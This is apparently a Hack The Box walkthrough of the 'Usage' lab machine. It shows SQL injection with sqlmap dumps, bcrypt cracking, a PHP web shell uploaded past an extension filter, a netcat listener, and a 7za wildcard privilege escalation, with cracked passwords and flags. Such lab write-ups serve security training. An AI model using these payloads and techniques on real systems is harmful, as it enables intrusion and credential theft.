@@ -1,0 +1,319 @@
+
+target 10.10.11.18
+
+sudo nano /etc/hosts
+
+10.10.11.18 usage.htb
+
+found admin.usage.htb in the webpage
+
+adding it to the hosts file
+ 
+
+    ~/sed/usage.htb  rustscan -a 10.10.11.18 --ulimit 9000          INT ✘ 
+.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
+| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
+| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
+`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
+The Modern Day Port Scanner.
+________________________________________
+: http://discord.skerritt.blog           :
+: https://github.com/RustScan/RustScan :
+ --------------------------------------
+Real hackers hack time ⌛
+
+[~] The config file is expected to be at "/home/sed/.rustscan.toml"
+[~] Automatically increasing ulimit value to 9000.
+Open 10.10.11.18:22
+Open 10.10.11.18:80
+[~] Starting Script(s)
+[~] Starting Nmap 7.94 ( https://nmap.org ) at 2024-04-22 15:15 IST
+Initiating Ping Scan at 15:15
+Scanning 10.10.11.18 [2 ports]
+Completed Ping Scan at 15:15, 0.06s elapsed (1 total hosts)
+Initiating Connect Scan at 15:15
+Scanning usage.htb (10.10.11.18) [2 ports]
+Discovered open port 22/tcp on 10.10.11.18
+Discovered open port 80/tcp on 10.10.11.18
+Completed Connect Scan at 15:15, 0.05s elapsed (2 total ports)
+Nmap scan report for usage.htb (10.10.11.18)
+Host is up, received syn-ack (0.055s latency).
+Scanned at 2024-04-22 15:15:31 IST for 0s
+
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack
+80/tcp open  http    syn-ack
+
+after fiddling into forgot password page with sqli payloads
+found 
+We have e-mailed your password reset link to sed@admin.com' AND 1=1;-- -
+
+Sql injection is possible
+
+crafting a sqli request using burpsuite post request 
+
+req.txt
+POST /forget-password HTTP/1.1
+Host: usage.htb
+Content-Length: 89
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://usage.htb
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.58 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://usage.htb/forget-password
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
+Cookie: XSRF-TOKEN=eyJpdiI6IlZBMHJ3NGE4MFlDek8xVGdoOFRNVXc9PSIsInZhbHVlIjoiNk16SzlCcmtTNzNadDdxS0JXUW81dWhOZGFwWnExS2d2K3RiRE9YNWt5Ui81Tk16M0JkYmJPWitFSzdueUhuemE5VWVxUm1veHJMMmJxenZoSXNMc3E4VUFwTFJFODBZZm1QMUV1Nlh4ejBodnFHZ1NzeFJ6dUR0N1k4alJLdnkiLCJtYWMiOiI3ZTNmMzkzNjE1YTY2ODAyMTA1OTU3ZjcyMWViNjNiODQ5N2NjMTYxOWFhMjNjNTBjYTY3OWI5MjgwNGExMjdmIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IjNJQnBDTDVhZUF6YVJ4a2VIOEhmN3c9PSIsInZhbHVlIjoib2x0ZHhCV0N5aFBiZzdBazVwSGxIaVY5U3h0QUN2RXNkZnpQM2JPTE5IbVpoMmI4eTFOYjFzemNQVzVCdU5zd2hvcmxNN1hEZFAyMHEzcTE0bUlVdGVRUlJJeWdXQWJRak4xTGNNY3pneTFPb1VPRmFpRnBjK1dLWkVmUW9SMmMiLCJtYWMiOiIyZmNiYzM1MDM3OGU1MGFlZDQ0MGE4NDc0NjI1ZThjNmU0NTA2MTMxM2Y0ODMxMmU0YWJiYTQxNTFiMTIwZWI0IiwidGFnIjoiIn0%3D
+Connection: close
+
+_token=T2Irqx4EH41yaVNOAaozNl1AgFViAAj7frhpIZPi&email=sed%40admin.com%27+AND+1%3D1%3B--+-
+
+sqlmap
+
+    ~/sed/usage.htb  sqlmap -r /home/sed/sed/usage.htb/req.txt  -p 'email' --dbms=mysql --level=3 --risk=3 --batch --dbs --dump --threads 10                                                           INT ✘ 
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.8.4.5#dev}
+|_ -| . [,]     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 17:53:28 /2024-04-22/
+
+[17:53:28] [INFO] parsing HTTP request from '/home/sed/sed/usage.htb/req.txt'
+[17:53:28] [INFO] resuming back-end DBMS operating system 'Linux' 
+
+found 3 tables
+
+[18:09:31] [INFO] retrieved: 10
+[18:10:51] [INFO] retrieved: usage_blog             
+available databases [3]:
+[*] information_schema
+[*] performance_schema
+[*] usage_blog
+
+lets search them
+                                                                                                                                                                                                                ~/sed/usage.htb  sqlmap -r /home/sed/sed/usage.htb/req.txt  -p 'email' --dbms=mysql --level=3 --risk=3 --batch -D usage_blog --tables --dump --threads 5                                       ✔  44s  
+        ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.8.4.5#dev}
+|_ -| . [']     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+
+
+retrieved the tables
+
+[18:33:13] [INFO] retrieved: users           
+Database: usage_blog
+[15 tables]
++------------------------+
+| admi?????????????      |
+| admin_menu             |
+| admin_operation_log    |
+| admin_role_menu        |
+| admin_role_permissions |
+| admin_role_users       |
+| admin_roles            |
+| admin_user_permissions |
+| admin_users            |
+| blog                   |
+| failed_jobs            |
+| migrations             |
+| password_reset_tokens  |
+| personal_access_tokens |
+| users                  |
++------------------------+
+
+
+dumping admin_users table
+
+    ~/sed/usage.htb  sqlmap -r /home/sed/sed/usage.htb/req.txt  -p 'email' --dbms=mysql --level=3 --risk=3 --batch -D usage_blog -T admin_users --dump --threads 4                              ✔  13m 9s  
+        ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.8.4.5#dev}
+|_ -| . [)]     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+
+got the admin hash
+Database: usage_blog
+Table: admin_users
+[1 entry]
++----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
+| id | name          | avatar  | password                                                     | username | created_at          | updated_at          | remember_token                                               |
++----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
+| 1  | Administrator | <blank> | $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2 | admin    | 2023-08-13 02:48:26 | 2024-04-22 12:52:45 | kThXIKu7GhLpgwStz7fCFxjDomCYS1SmPpxwEkzv1Sdzva0qLYaDhllwrsLT |
++----+---------------+---------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
+
+analyzing and decrypting hash
+
+    ~/sed/usage.htb  hashid '$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2'                                                                                                                 ✔ 
+Analyzing '$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2'
+[+] Blowfish(OpenBSD) 
+[+] Woltlab Burning Board 4.x 
+[+] bcrypt 
+
+$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2:whatever1
+
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
+Hash.Target......: $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH...fUPrL2
+Time.Started.....: Mon Apr 22 19:07:54 2024 (2 secs)
+Time.Estimated...: Mon Apr 22 19:07:56 2024 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/Seclists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:     1245 H/s (8.46ms) @ Accel:1 Loops:16 Thr:24 Vec:1
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 2160/14344384 (0.02%)
+Rejected.........: 0/2160 (0.00%)
+Restore.Point....: 1440/14344384 (0.01%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:1008-1024
+Candidate.Engine.: Device Generator
+Candidates.#1....: rachelle -> myfamily
+Hardware.Mon.#1..: Temp: 48c Util: 95% Core:2002MHz Mem:7000MHz Bus:16
+
+Started: Mon Apr 22 19:07:41 2024
+Stopped: Mon Apr 22 19:07:58 2024
+
+so the username and password is
+
+admin:whatever1
+
+using this in admin.usage.htb
+
+start burpsuite and edit admin profile 
+
+http://admin.usage.htb/admin/auth/setting
+
+
+shell.php
+
+<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
+
+edit the filename from shell.php to shell.jpg 
+
+upload shell.jpg
+
+and while uploading change the filename in burpsuite proxy
+
+Administrator
+------WebKitFormBoundarycbOklzKxagMyDzpq
+Content-Disposition: form-data; name="avatar"; filename="sed.php"
+Content-Type: image/php
+
+the file is uploaded to 
+http://admin.usage.htb/uploads/images/sed.php
+
+open a netcat listener 
+nc -lnvp 6969
+
+cd /home/dash
+$ cat user.txt
+be0e2debb78e2ce3e3cbf870a4471ee0
+
+privilage escalation
+
+found one file .monitrc
+
+dash@usage:~$ ls -la
+total 60
+drwxr-x--- 8 dash dash 4096 Apr 22 16:05 .
+drwxr-xr-x 4 root root 4096 Aug 16  2023 ..
+lrwxrwxrwx 1 root root    9 Apr  2 20:22 .bash_history -> /dev/null
+-rw-r--r-- 1 dash dash 3771 Jan  6  2022 .bashrc
+drwx------ 3 dash dash 4096 Aug  7  2023 .cache
+drwxrwxr-x 4 dash dash 4096 Aug 20  2023 .config
+drwx------ 3 dash dash 4096 Apr 22 15:45 .gnupg
+drwxrwxr-x 3 dash dash 4096 Aug  7  2023 .local
+-rw-r--r-- 1 dash dash   32 Oct 26 04:50 .monit.id
+-rw-r--r-- 1 dash dash    6 Apr 22 16:05 .monit.pid
+-rwx------ 1 dash dash  707 Oct 26 04:49 .monitrc
+-rw------- 1 dash dash 1192 Apr 22 16:05 .monit.state
+-rw-r--r-- 1 dash dash  807 Jan  6  2022 .profile
+drwx------ 3 dash dash 4096 Apr 22 15:27 snap
+drwx------ 2 dash dash 4096 Aug 24  2023 .ssh
+-rw-r----- 1 root dash   33 Apr 22 15:00 user.txt
+
+dash@usage:~$ cat .monitrc 
+#Monitoring Interval in Seconds
+set daemon  60
+
+#Enable Web Access
+set httpd port 2812
+     use address 127.0.0.1
+     allow admin:3nc0d3d_pa$$w0rd
+     
+got xander's password
+
+dash@usage:~$ su xander
+Password: 
+
+xander@usage:/home/dash$ sudo -l
+Matching Defaults entries for xander on usage:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User xander may run the following commands on usage:
+    (ALL : ALL) NOPASSWD: /usr/bin/usage_management
+
+
+using strings for checking binary usage_management
+
+found something in the binary i remember 
+
+/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *
+
+priv reference 
+https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks#id-7z
+
+
+cd /var/www/html
+xander@usage:/var/www/html$  ln -sf /root/root.txt root.txt
+xander@usage:/var/www/html$ touch @root.txt
+xander@usage:/var/www/html$ ls -la
+total 16
+drwxrwxrwx  4 root   xander 4096 Apr 22 17:24 .
+drwxr-xr-x  3 root   root   4096 Apr  2 21:15 ..
+drwxrwxr-x 13 dash   dash   4096 Apr  2 21:15 project_admin
+-rw-rw-r--  1 xander xander    0 Apr 22 17:24 @root.txt
+lrwxrwxrwx  1 xander xander   14 Apr 22 17:24 root.txt -> /root/root.txt
+drwxrwxr-x 12 dash   dash   4096 Apr  2 21:15 usage_blog
+xander@usage:/var/www/html$ sudo /usr/bin/usage_management 
+Choose an option:
+1. Project Backup
+2. Backup MySQL data
+3. Reset admin password
+Enter your choice (1/2/3): 1
+
+====
+
+Updating archive: /var/backups/project.zip
+
+Items to compress: 20945
+
+                                                                               
+Files read from disk: 17961
+Archive size: 54891584 bytes (53 MiB)
+
+Scan WARNINGS for files and folders:
+
+f978874a2a5f86319449df125cc12300 : No more files
+
+
+got root flag as an error :)
+
+f978874a2a5f86319449df125cc12300
+
+
+happy hacking
+
+
